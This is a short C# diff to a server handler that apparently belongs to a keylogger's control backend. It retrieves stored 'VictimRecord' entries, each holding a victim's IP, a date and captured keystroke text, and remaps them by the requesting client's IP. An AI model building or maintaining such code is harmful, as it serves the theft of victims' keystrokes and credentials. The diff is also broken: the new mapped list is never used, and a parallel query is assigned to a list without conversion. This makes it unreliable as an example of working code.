@@ -37,7 +37,17 @@ namespace Server.Handlers
                 return _director.GetUnauthorizedResponse().ToString();
 
             string ip = clientInfo.RemoteEndPoint.Split(":")[0];
-            List<VictimRecord> records = Data.RecordsContainer.GetRecordsByIp(ip);
+            List<RecordData> records = Data.RecordsContainer.GetRecordsByIp(ip);
+
+            List<VictimRecord> rep = records
+                .AsParallel()
+                .Select(r => new VictimRecord
+                {
+                    Id = r.Id,
+                    VictimIp = r.Ip,
+                    Text = r.Keys,
+                    Date = r.Date
+                });
 
             return _director.GetVictimRecordsResponse(records).ToString();
         }
